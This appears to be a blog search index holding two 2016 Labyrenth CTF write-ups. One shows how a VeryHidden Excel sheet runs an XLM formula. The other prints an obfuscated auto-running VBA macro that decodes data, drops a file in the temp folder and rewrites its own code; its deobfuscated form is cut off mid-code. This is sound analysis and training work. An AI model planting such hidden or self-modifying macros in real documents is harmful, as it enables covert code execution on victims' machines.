<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[2016 Palo Alto Labyrenth CTF Doc 05]]></title>
      <url>https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/</url>
      <content type="html"><![CDATA[<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> &lt;- You are here</li>
</ul>
<p>Again the fifth challenge is a zip file: <a href="/data/PAN_CTF_DOCTrack_005.zip">01E1B7BCFB39B4A666475991AF11C5762A489F9395C48B4E156526E1C6E4573F</a></p>
<p>But I have to first admit that I solved this one third, not fifth…in fact I got a message when I tried to submit the fifth challenge solution early that I had to do them in order. How did I do them out of order you ask? well remember in the very first document there was an extra <code>.7z</code> file inside the zip. This was a 7Zip archive that contained ALL of the challenges (go look for yourself).</p>
<p>So running it through <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a> showed only a little bit of macros:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Sub excelulate()</div><div class="line"></div><div class="line">    Application.Quit</div><div class="line"></div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>So I crack the file open in Microsoft Excel….hmmm its only asking for a value and a button. You click the button and it says you stink and opens calc.exe. Wait what? there’s no macro’s how is this happening? So I open the file in eDoc. What is eDoc you say? its a GUI application for looking at the streams and folders inside an Ole Structured Storage container. I don’t have a link for it as the company that produced it no longer exists, but I still have the binary…besides a very similar tool is <a href="http://www.mitec.cz/ssv.html" target="_blank" rel="external">SSView</a> by MiTec (in fact is in many ways better…but eDoc lets me search for hex/ascii values and do inline editing).</p>
<p>So perusing through the hex view of the <code>Workbook</code> stream (i.e. where the actual workbooks live) we can easily see calc.exe (around stream offset 0x5b90 as well as other places) and several other strings that were NOT on the three sheets when we opened Excel eariler….HIDDEN SHEETS.</p>
<p>So open up excel, right click on and of the sheet names and click <code>unhide</code>…a little dialog opens up and we can unhide the <code>secret</code> sheet. But wait it looks empty. So we start looking through the formula values and eventually you will find cell A14 with this formula:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=IF(RUN(supersecret!F13))</div></pre></td></tr></table></figure></p>
<p>So here you need to know excel forumlas and you will see that the notation they’re using shows there is ANOTHER hidden sheet. what? how can this be you ask? well turns out that excel has something called a VeryHidden sheet (see <a href="https://support.microsoft.com/en-us/kb/213609" target="_blank" rel="external">KB213609</a>, or just search the InterTubes yourself)</p>
<p>Hmmm, so how do we unhide a very hidden sheet? well just fix it in VBA. So there’s already a function <code>excelulate</code> so I simply changed it to:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Sub excelulate()</div><div class="line">    ActiveWorkbook.Sheets(&quot;supersecret&quot;).Visible = True</div><div class="line">End Sub</div></pre></td></tr></table></figure>
<p>and then run it!</p>
<p>so we look at the newly discovered sheet and we find the crazy formula in F13:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=RETURN(EXACT(CONCATENATE(D7,A5,C5,B4,E20,B6,A8,B8,A12,B10,E10,C9,B13,D12,C11,B16,A25,A18,B19,C20,B21,B2,D23,B24,E4,B26,D16,A21,C14,A16),Sheet1!B3))</div></pre></td></tr></table></figure></p>
<p>So I copy this into another cell in the same sheet, but modifiy at so:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=CONCATENATE(D7,A5,C5,B4,E20,B6,A8,B8,A12,B10,E10,C9,B13,D12,C11,B16,A25,A18,B19,C20,B21,B2,D23,B24,E4,B26,D16,A21,C14,A16)</div></pre></td></tr></table></figure></p>
<p>but wait it doesn’t run it! this sheet is showing the forumlas instead of running them. No problem, I go back to the <code>Sheet1</code> sheet and pick an empty cell and enter the formula:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=supersecret!F16</div></pre></td></tr></table></figure></p>
<p>and poof! we have this value:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PAN&#123;Exc3l4=3x7r3me1y4An7a5+!c&#125;</div></pre></td></tr></table></figure></p>
<p>we enter it into the CTF dialog</p>
<p>BOOM</p>
<p>completed!</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016 Palo Alto Labyrenth CTF Doc 04]]></title>
      <url>https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/</url>
      <content type="html"><![CDATA[<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a> &lt;- You are here</li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> </li>
</ul>
<p>Ok, so the fourth challenge is again a zip file (hash: 1A2570D5CC6E2C3A185E939DC49CB4B908B867E02AC84BF7ABB532B3395FB01A) and it contains a file fun.docm (hash: <a href="/data/PAN_CTF_DOCTrack_004.zip">4AE794A701D2F28BA7E6292F0463444F6A567CB7C26188A518270544252877FB</a>). Now the first thing you need to know about the newer office file formats is that they are all zip files. So yes a DOCM and a XLSX and a PPTX, etc are all ZIP files with various contents pieces inside (see <a href="https://github.com/DBHeise/fileid/wiki/zip" target="_blank" rel="external">here</a> for other zip based documents)</p>
<p>SIDENOTE: this is one of the very reasons that I wrote my <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a> tool to begin with. Most file identification apps don’t go very much beyond magic headers. If we understand that the magic header gives us a container format (i.e. Ole Structured Storage [OLESS], ZIP, and many others), then we can parse that container and gain much more information. This is exactly what FileId does it understands OLESS files and ZIP files and has some ideas what to look for inside to figure out its true file type.</p>
<p>SIDE-SIDENOTE: Of course since its a container then we can do nasty things that were never intended to be done…like having a DOC, XLS, PPT all in a single file and all open completely different content depending on which app is opening it.</p>
<p>ok, back to the challenge at hand and DOCM file! we can verify its a DOCM by running it through <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a> or we can simply run 7zip and extract the contents…which is what I did. Since its truly a DOCM we will find a file inside the <code>WORD</code> subfolder named <code>vbaProject.bin</code> (it actually doesn’t have to be named this, but I digress). I also happen to know that this is also an OLESS file, so again we can run it through <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a>, but there is a known bug in <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a> here…</p>
<p>So here we have a couple of choices as what to do next, but the underlying principle is to get to the VBA…here are several options (I did them all):</p>
<ol>
<li>use olevba.py in <a href="http://www.decalage.info/python/oletools" target="_blank" rel="external">OleTools</a> by Philippe Lagadec</li>
<li>use the office object model to open and save the file in the DOC format (won’t run macro, but will maintain them)</li>
<li>unzip the DOCM, edit the <code>vbaProject.bin</code> to remove the  protections and alter the autorun functionname (how to do this will be covered in the <a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> writeup)</li>
</ol>
<p>So lets assume you did one of those, you’d get the following macro parts:</p>
<p>=ThisDocument=<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line">#If VBA7 And Win64 Then</div><div class="line">Private Declare PtrSafe Function jFlnz8 Lib &quot;winmm.dll&quot; Alias &quot;sndPlaySoundA&quot; _</div><div class="line">       (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long</div><div class="line">#Else</div><div class="line">Private Declare Function jFlnz8 Lib &quot;winmm.dll&quot; Alias &quot;sndPlaySoundA&quot; _</div><div class="line">       (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long</div><div class="line">#End If</div><div class="line"></div><div class="line">Public cMSuxt As Variant</div><div class="line">Public gkKg As Object</div><div class="line">Public cN3r As String</div><div class="line">Public kZ4gU8sc As String</div><div class="line">Public qa317 As Integer</div><div class="line"></div><div class="line">Sub znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb()</div><div class="line">    Selection.WholeStory</div><div class="line">    Selection.Font.ColorIndex = (Selection.Font.ColorIndex + 1) Mod 15</div><div class="line">    If Selection.Font.ColorIndex Mod 2 = 0 Then</div><div class="line">        Set gkKg = CreateObject(&quot;Excel.Application&quot;)</div><div class="line">        gkKg.Speech.speak NpuXrzgq.Label1, True</div><div class="line">        gkKg.Quit</div><div class="line">    ElseIf Selection.Font.ColorIndex Mod 2 = 1 Then</div><div class="line">        adk49an = Environ(&quot;tmp&quot;) &amp; &quot;\&quot; &amp; &quot;asdf&quot;</div><div class="line">        jFlnz8 adk49an, 1</div><div class="line">    End If</div><div class="line">    Application.OnTime Now + TimeValue(&quot;00:00:01&quot;), &quot;znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb&quot;</div><div class="line">End Sub</div><div class="line"></div><div class="line">Private Sub UxKo3LivfGHxI2OtWa3KtqOgY6cRb5yrbR00(m4dYL, fviLw9)</div><div class="line">    On Error GoTo NavnYIF0:</div><div class="line">    Dim fjGeMmP8Z() As Byte</div><div class="line">    fjGeMmP8Z = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(m4dYL)</div><div class="line">    Z1yiWeP.pZVZ0Q8ygfA6jcSJRLEKZSyv40IDQzErCpah fjGeMmP8Z, fviLw9</div><div class="line">NavnYIF0:</div><div class="line">    GoTo VadXU4</div><div class="line">VadXU4:</div><div class="line"></div><div class="line">End Sub</div><div class="line"></div><div class="line">Private Function BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz(dd) As Boolean</div><div class="line">    BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz = False</div><div class="line">    On Error GoTo B3A:</div><div class="line">    Dim A4xcPiKtrr() As Byte</div><div class="line">    A4xcPiKtrr = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(dd)</div><div class="line">    BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz = Z1yiWeP.Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB(A4xcPiKtrr)</div><div class="line">B3A:</div><div class="line">End Function</div><div class="line"></div><div class="line">Private Function zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy()</div><div class="line">    zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy = None</div><div class="line">    For Each ok0I11 In ActiveDocument.VBProject.VBComponents</div><div class="line">        l = 1</div><div class="line">        Set gjvhSFe = ok0I11.CodeModule</div><div class="line">        Do While l &lt; gjvhSFe.CountOfLines</div><div class="line">            za29rx = gjvhSFe.ProcOfLine(l, 0)</div><div class="line">            If za29rx &lt;&gt; &quot;&quot; Then</div><div class="line">                If BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz(za29rx) Then</div><div class="line">                    zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy = za29rx</div><div class="line">                    GoTo CfHFE</div><div class="line">                End If</div><div class="line">                l = l + gjvhSFe.ProcCountLines(za29rx, 0)</div><div class="line">            Else</div><div class="line">                l = l + 1</div><div class="line">            End If</div><div class="line">        Loop</div><div class="line">    Next ok0I11</div><div class="line">CfHFE:</div><div class="line">End Function</div><div class="line"></div><div class="line">Private Sub XiqyXdC809pP5esSrC633ag92w0x6otQylY0()</div><div class="line">    sN2l0P = zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy</div><div class="line">    If Not IsNull(sN2l0P) Then</div><div class="line">        For Each LHKwfvbUC In ActiveDocument.VBProject.VBComponents</div><div class="line">            If LHKwfvbUC.Type = 1 Then</div><div class="line">                HKwfvbU = 1</div><div class="line">                Set cm = LHKwfvbUC.CodeModule</div><div class="line">                Do While HKwfvbU &lt; cm.CountOfLines</div><div class="line">                    pn = cm.ProcOfLine(HKwfvbU, 0)</div><div class="line">                    If pn &lt;&gt; &quot;&quot; Then</div><div class="line">                        UxKo3LivfGHxI2OtWa3KtqOgY6cRb5yrbR00 pn, sN2l0P</div><div class="line">                        HKwfvbU = HKwfvbU + cm.ProcCountLines(pn, 0)</div><div class="line">                    Else</div><div class="line">                        HKwfvbU = HKwfvbU + 1</div><div class="line">                    End If</div><div class="line">                Loop</div><div class="line">            End If</div><div class="line">        Next LHKwfvbUC</div><div class="line">    End If</div><div class="line">    zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k</div><div class="line">End Sub</div><div class="line"></div><div class="line">Private Function OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL(e2qBnJA1D, GNheMViA)</div><div class="line">    df = Environ(&quot;tmp&quot;) &amp; &quot;\&quot; &amp; e2qBnJA1D</div><div class="line">    Dim CiuxGXWXyEUw4() As Byte</div><div class="line">    CiuxGXWXyEUw4 = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(GNheMViA)</div><div class="line">    Open df For Binary Access Write As #1</div><div class="line">    Put #1, , CiuxGXWXyEUw4</div><div class="line">    Close #1</div><div class="line">    OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL = df</div><div class="line">End Function</div><div class="line"></div><div class="line">Private Sub zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k()</div><div class="line">    yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5</div><div class="line">    Selection.WholeStory</div><div class="line">    Selection.Delete</div><div class="line">    Selection.TypeText NpuXrzgq.Label1</div><div class="line">    Selection.WholeStory</div><div class="line">    Selection.Font.Size = 72</div><div class="line">    znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb</div><div class="line">End Sub</div><div class="line"></div><div class="line">Private Sub yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5()</div><div class="line">    cMSuxt = Array(OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL(&quot;asdf&quot;, NpuXrzgq.assda))</div><div class="line">    kZ4gU8sc = NpuXrzgq.Label1</div><div class="line">End Sub</div><div class="line"></div><div class="line">Public Sub Document_Open()</div><div class="line">    On Error GoTo sjjQMD:</div><div class="line">    If ActiveDocument.VBProject.VBComponents.Count &gt; 4 Then</div><div class="line">        XiqyXdC809pP5esSrC633ag92w0x6otQylY0</div><div class="line">    Else</div><div class="line">        zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k</div><div class="line">    End If</div><div class="line">sjjQMD:</div><div class="line">    If err.Number = 6068 Or err.Number = 50289 Then</div><div class="line">        zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k</div><div class="line">    Else</div><div class="line">        Resume Next</div><div class="line">    End If</div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>=Z1yiWeP=<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line">Attribute VB_Name = &quot;Z1yiWeP&quot;</div><div class="line">Function d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(JwFeyAb5x, AgkWcn As Byte) As Variant</div><div class="line">    Dim bzTec() As Byte</div><div class="line">    ReDim bzTec(UBound(JwFeyAb5x))</div><div class="line">    For cz9vzhBR = 0 To UBound(JwFeyAb5x)</div><div class="line">        bzTec(cz9vzhBR) = JwFeyAb5x(cz9vzhBR) Xor AgkWcn</div><div class="line">    Next</div><div class="line">    d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql = bzTec</div><div class="line">End Function</div><div class="line"></div><div class="line">Private Sub ir0a6FeeF0LUThieRM7v6qxfWFJD1dT6BzDH()</div><div class="line">    Dim opy7ej As VBIDE.VBProject</div><div class="line">    Dim PiO3rcWe As VBIDE.VBComponent</div><div class="line">    Set opy7ej = ActiveDocument.VBProject</div><div class="line">    Set PiO3rcWe = opy7ej.VBComponents(&quot;IadnoxRap3&quot;)</div><div class="line">    opy7ej.VBComponents.Remove PiO3rcWe</div><div class="line">End Sub</div><div class="line"></div><div class="line">Function YhGEH9M4EBM4CJgXjOsrcHsa(u48G As Byte, G6NK) As Variant</div><div class="line">    YhGEH9M4EBM4CJgXjOsrcHsa = d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(G6NK, u48G)</div><div class="line">End Function</div><div class="line"></div><div class="line">Function lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo(sHZF70G) As String</div><div class="line">    TPjEpV = &quot;&quot;</div><div class="line">    For cz9vzhBR = 1 To UBound(sHZF70G)</div><div class="line">        TPjEpV = TPjEpV &amp; StrConv(sHZF70G(cz9vzhBR), 64)</div><div class="line">    Next</div><div class="line">    lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo = StrConv(sHZF70G, 64)</div><div class="line">End Function</div><div class="line"></div><div class="line">Function oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(Rfn10hWpA, XPbV8Rj5Q) As Boolean</div><div class="line">    If UBound(Rfn10hWpA) = UBound(XPbV8Rj5Q) Then</div><div class="line">        oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = True</div><div class="line">        For z5PQAfu9 = 0 To UBound(Rfn10hWpA)</div><div class="line">            If (Rfn10hWpA(z5PQAfu9) &lt;&gt; XPbV8Rj5Q(z5PQAfu9)) Then</div><div class="line">                oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = False</div><div class="line">                z5PQAfu9 = UBound(Rfn10hWpA)</div><div class="line">            End If</div><div class="line">        Next z5PQAfu9</div><div class="line">    Else</div><div class="line">        oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = False</div><div class="line">    End If</div><div class="line">End Function</div><div class="line"></div><div class="line">Private Sub DGOoR0P7MooO533jiHhTv1sgIoOtbjkzd57H()</div><div class="line">    Dim yQnfle As VBIDE.VBProject</div><div class="line">    Dim TQhuHj As VBIDE.VBComponent</div><div class="line">    Set yQnfle = ActiveDocument.VBProject</div><div class="line">    Set TQhuHj = yQnfle.VBComponents.Add(1)</div><div class="line">    TQhuHj.CodeModule.InsertLines 1, lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo( _</div><div class="line">    d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(U8pblvDZuAh8GY.TextBox1 _</div><div class="line">    ), U8pblvDZuAh8GY.TextBox1.Left))</div><div class="line">    TQhuHj.Name = &quot;IadnoxRap3&quot;</div><div class="line">End Sub</div><div class="line"></div><div class="line">Function bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk(ToEZKjU, qSFa4f) As Variant</div><div class="line">    Dim Qteou7() As Byte</div><div class="line">    ReDim Qteou7(UBound(ToEZKjU))</div><div class="line">    For Uvhtuj = 0 To UBound(ToEZKjU)</div><div class="line">        Qteou7(Uvhtuj) = ToEZKjU(Uvhtuj) Xor qSFa4f(Uvhtuj)</div><div class="line">    Next</div><div class="line">    bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk = Qteou7</div><div class="line">End Function</div><div class="line"></div><div class="line">Function Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB(nuQXoad42c5)</div><div class="line">    Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB = False</div><div class="line">    Dim yTV2li() As Byte</div><div class="line">    yTV2li = Z1yiWeP.d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(nuQXoad42c5, U8pblvDZuAh8GY.HelpContextId)</div><div class="line">    Dim VGmMTyf() As Byte</div><div class="line">    VGmMTyf = Z1yiWeP.YhGEH9M4EBM4CJgXjOsrcHsa(Int(U8pblvDZuAh8GY.ScrollHeight), yTV2li)</div><div class="line">    If oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(VGmMTyf, t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(U8pblvDZuAh8GY.Label1.Caption)) Then</div><div class="line">        Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB = True</div><div class="line">    End If</div><div class="line">End Function</div><div class="line"></div><div class="line">Function t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(qqZUlc9)</div><div class="line">    aexjT = Trim(qqZUlc9)</div><div class="line">    Set vW3zM = CreateObject(StrReverse(&quot;tnemucoDMOD.2LMXSM&quot;))</div><div class="line">    Set ugBi6C = vW3zM.createElement(&quot;b64&quot;)</div><div class="line">    ugBi6C.dataType = &quot;bin.base&quot; + CStr(vbUnicode)</div><div class="line">    ugBi6C.Text = aexjT</div><div class="line">    t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG = ugBi6C.nodeTypedValue</div><div class="line">    Set ugBi6C = Nothing</div><div class="line">    Set vW3zM = Nothing</div><div class="line">End Function</div><div class="line"></div><div class="line">Sub XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM(EZ9KcDzT, pNRoZP57xLx)</div><div class="line">    Dim ang8rjzwn() As Byte</div><div class="line">    ang8rjzwn = Z1yiWeP.d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(EZ9KcDzT, U8pblvDZuAh8GY.ScrollWidth)</div><div class="line">    Dim upnFZMT9P() As Byte</div><div class="line">    upnFZMT9P = Z1yiWeP.YhGEH9M4EBM4CJgXjOsrcHsa(U8pblvDZuAh8GY.Zoom, ang8rjzwn)</div><div class="line">    Dim s06() As Byte</div><div class="line">    s06 = Z1yiWeP.bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk(upnFZMT9P, t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(pNRoZP57xLx))</div><div class="line">    If Z1yiWeP.oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(s06, Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(StrReverse(U8pblvDZuAh8GY.Tag))) Then</div><div class="line">        MsgBox Z1yiWeP.lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo(EZ9KcDzT)</div><div class="line">    End If</div><div class="line">End Sub</div><div class="line"></div><div class="line">Sub pZVZ0Q8ygfA6jcSJRLEKZSyv40IDQzErCpah(tnfbhVCs, AjkbXE)</div><div class="line">    XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM tnfbhVCs, AjkbXE</div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>so there’s a bunch of stuff…now what. Well I spent waaayyy to much time deobfuscating &amp; renaming every function to something more meaningful and useful. So I have a DOCM that is cleanedup and safe to open (i.e. no Document_Open subroutine, no passwords or anything). Get it here: <a href="/data/FILE.cleaned.docm">19E8BE71029D5900C54EB2213E097BC442003C1F4F5E7940B71F9902A00270FB</a>. </p>
<p>like I said I spent too much time going over each function, figuring out what it does and renaming it (yes I wrote some tools for this, but they’re not ready to share).</p>
<p>If you look at the code in the clean-up document take a look at the last few functions in the `mod1’ module:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">Sub fnCheck(fnB64Arry, customKey)</div><div class="line">    Dim tmp1() As Byte</div><div class="line">    tmp1 = mod1.fnSimpleXor(fnB64Arry, frm2.ScrollWidth)</div><div class="line">    Dim tmp2() As Byte</div><div class="line">    tmp2 = mod1.fnSimpleXor_wrapper(frm2.Zoom, tmp1)</div><div class="line">    Dim tmp3() As Byte</div><div class="line">    tmp3 = mod1.fnCustomXor(tmp2, fnToBase64Ary(customKey))</div><div class="line">    </div><div class="line">    Dim a1 As String: a1 = mod1.toString(fnB64Arry)</div><div class="line">    Dim a2 As String: a2 = mod1.toString(tmp3)</div><div class="line">    Dim a3 As String: a3 = mod1.toString(mod1.fnToBase64Ary(StrReverse(frm2.Tag)))</div><div class="line">    </div><div class="line">    If mod1.fnIsB64Identicals(tmp3, mod1.fnToBase64Ary(StrReverse(frm2.Tag))) Then</div><div class="line">        MsgBox a2</div><div class="line">    End If</div><div class="line">End Sub</div><div class="line"></div><div class="line">Sub test()</div><div class="line">    b64 = 